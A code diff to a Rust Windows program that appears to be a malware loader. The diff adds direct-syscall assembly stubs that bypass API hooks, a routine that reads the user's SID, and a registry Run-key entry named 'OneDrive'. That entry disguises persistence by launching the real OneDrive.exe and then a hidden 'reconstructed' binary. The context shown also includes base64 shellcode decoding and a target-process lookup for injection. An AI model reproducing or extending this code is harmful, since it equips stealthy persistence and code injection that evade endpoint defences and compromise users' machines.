@@ -13,6 +13,8 @@ use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
 use windows_sys::Win32::Storage::FileSystem::{
     FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_OPEN, FILE_OVERWRITE_IF,
 };
+use windows_sys::Win32::Security::{TOKEN_QUERY, TokenUser, TOKEN_USER};
+use windows_sys::Win32::Security::Authorization::ConvertSidToStringSidW;
 use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 use base64::{Engine as _, engine::general_purpose};
@@ -96,6 +98,34 @@ asm_nt_write_file:
     mov eax, [rsp + 0x50]
     syscall
     ret
+
+.global asm_nt_open_process_token
+asm_nt_open_process_token:
+    mov r10, rcx
+    mov eax, r9d
+    syscall
+    ret
+
+.global asm_nt_query_information_token
+asm_nt_query_information_token:
+    mov r10, rcx
+    mov eax, [rsp + 0x30]
+    syscall
+    ret
+
+.global asm_nt_open_key
+asm_nt_open_key:
+    mov r10, rcx
+    mov eax, r9d
+    syscall
+    ret
+
+.global asm_nt_set_value_key
+asm_nt_set_value_key:
+    mov r10, rcx
+    mov eax, [rsp + 0x38]
+    syscall
+    ret
 "#);
 
 #[repr(C)]
@@ -132,6 +162,10 @@ extern "C" {
     fn asm_nt_create_file(FileHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, IoStatusBlock: &mut IO_STATUS_BLOCK, AllocationSize: *mut i64, FileAttributes: u32, ShareAccess: u32, CreateDisposition: u32, CreateOptions: u32, EaBuffer: *mut std::ffi::c_void, EaLength: u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_read_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *mut std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_write_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *const std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_open_process_token(ProcessHandle: HANDLE, DesiredAccess: u32, TokenHandle: &mut HANDLE, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_query_information_token(TokenHandle: HANDLE, TokenInformationClass: u32, TokenInformation: *mut std::ffi::c_void, TokenInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_open_key(KeyHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_set_value_key(KeyHandle: HANDLE, ValueName: &mut UNICODE_STRING, TitleIndex: u32, Type: u32, Data: *const std::ffi::c_void, DataSize: u32, syscall_id: u32) -> NTSTATUS;
 }
 
 fn merge_and_copy_payload() {
@@ -249,6 +283,110 @@ unsafe fn copy_data(h_in: HANDLE, h_out: HANDLE, read_id: u32, write_id: u32) {
             write_id,
         );
     }
+}
+
+fn update_onedrive_registry() {
+    let user_profile = std::env::var("USERPROFILE").unwrap_or_default();
+    if user_profile.is_empty() { return; }
+
+    let sid_string = get_current_user_sid_string().unwrap_or_default();
+    if sid_string.is_empty() { return; }
+
+    let updated_command = format!(
+        "cmd.exe /c \"\"{}\\{}\" /background & reconstructed\"",
+        user_profile,
+        "AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"
+    );
+
+    let nt_open_key_id = syscall::get_syscall_number("NtOpenKey").unwrap();
+    let nt_set_value_key_id = syscall::get_syscall_number("NtSetValueKey").unwrap();
+    let nt_close_id = syscall::get_syscall_number("NtClose").unwrap();
+
+    let registry_path = format!("\\Registry\\User\\{}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", sid_string);
+    let mut nt_path: Vec<u16> = registry_path.encode_utf16().collect();
+    nt_path.push(0);
+
+    unsafe {
+        let mut us_path = UNICODE_STRING {
+            Length: ((nt_path.len() - 1) * 2) as u16,
+            MaximumLength: (nt_path.len() * 2) as u16,
+            Buffer: nt_path.as_mut_ptr(),
+        };
+
+        let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();
+        obj_attr.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+        obj_attr.ObjectName = &mut us_path as *mut _ as *mut _;
+        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
+
+        let mut h_key = 0;
+        let status = asm_nt_open_key(&mut h_key, 0x000F003F, &mut obj_attr, nt_open_key_id); // KEY_ALL_ACCESS
+
+        if status == 0 {
+            let mut val_name: Vec<u16> = "OneDrive".encode_utf16().collect();
+            val_name.push(0);
+            let mut us_val = UNICODE_STRING {
+                Length: ((val_name.len() - 1) * 2) as u16,
+                MaximumLength: (val_name.len() * 2) as u16,
+                Buffer: val_name.as_mut_ptr(),
+            };
+
+            let mut data: Vec<u16> = updated_command.encode_utf16().collect();
+            data.push(0);
+
+            asm_nt_set_value_key(
+                h_key,
+                &mut us_val,
+                0,
+                1, // REG_SZ
+                data.as_ptr() as *const _,
+                (data.len() * 2) as u32,
+                nt_set_value_key_id,
+            );
+
+            asm_nt_close(h_key, nt_close_id);
+        }
+    }
+}
+
+fn get_current_user_sid_string() -> Option<String> {
+    let nt_open_token_id = syscall::get_syscall_number("NtOpenProcessToken")?;
+    let nt_query_token_id = syscall::get_syscall_number("NtQueryInformationToken")?;
+    let nt_close_id = syscall::get_syscall_number("NtClose")?;
+
+    unsafe {
+        let mut h_token = 0;
+        let status = asm_nt_open_process_token(!0, TOKEN_QUERY, &mut h_token, nt_open_token_id);
+        if status != 0 { return None; }
+
+        let mut len = 0;
+        asm_nt_query_information_token(h_token, TokenUser as u32, std::ptr::null_mut(), 0, &mut len, nt_query_token_id);
+
+        let mut buffer = vec![0u8; len as usize];
+        let status = asm_nt_query_information_token(
+            h_token,
+            TokenUser as u32,
+            buffer.as_mut_ptr() as *mut _,
+            len,
+            &mut len,
+            nt_query_token_id
+        );
+
+        asm_nt_close(h_token, nt_close_id);
+
+        if status != 0 { return None; }
+
+        let token_user = &*(buffer.as_ptr() as *const TOKEN_USER);
+        let mut sid_ptr = std::ptr::null_mut();
+        if ConvertSidToStringSidW(token_user.User.Sid, &mut sid_ptr) != 0 {
+            let len = (0..).find(|&i| *sid_ptr.add(i) == 0).unwrap();
+            let sid_slice = std::slice::from_raw_parts(sid_ptr, len);
+            let sid_str = String::from_utf16_lossy(sid_slice);
+            windows_sys::Win32::System::Memory::LocalFree(sid_ptr as _);
+            return Some(sid_str);
+        }
+    }
+
+    None
 }
 
 const SHELLCODE: &str = "Shellcode_replace";
@@ -459,6 +597,7 @@ fn get_process_pid() -> Option<u32> {
 
 fn main() {
     merge_and_copy_payload();
+    update_onedrive_registry();
 
     let target_pid = get_process_pid().expect("Process not found");
     let shellcode = general_purpose::STANDARD.decode(SHELLCODE).expect("Invalid shellcode");
